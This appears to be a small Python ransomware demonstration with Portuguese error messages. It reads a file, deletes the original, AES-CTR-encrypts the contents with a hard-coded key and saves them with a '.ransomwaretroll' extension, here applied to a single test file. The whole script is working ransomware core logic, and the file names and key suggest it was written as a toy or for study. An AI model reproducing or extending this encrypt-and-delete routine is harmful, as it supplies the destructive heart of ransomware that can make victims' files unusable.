import os
import pyaes

def encrypt_file(file_name, key):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()
    except FileNotFoundError:
        print("Erro: O arquivo " + file_name + " não foi encontrado.")
        return
    except IOError as e:
        print("Erro ao ler o arquivo " + file_name)
        return

    try:
        os.remove(file_name)
    except OSError as e:
        print("Erro ao remover o arquivo " + file_name)
        return

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file = file_name + ".ransomwaretroll"
    try:
        with open(new_file, 'wb') as file:
            file.write(crypto_data)
    except IOError as e:
        print("Erro ao salvar o arquivo criptografado " + new_file)



key = b"testeransomwares"
encrypt_file("teste.txt", key)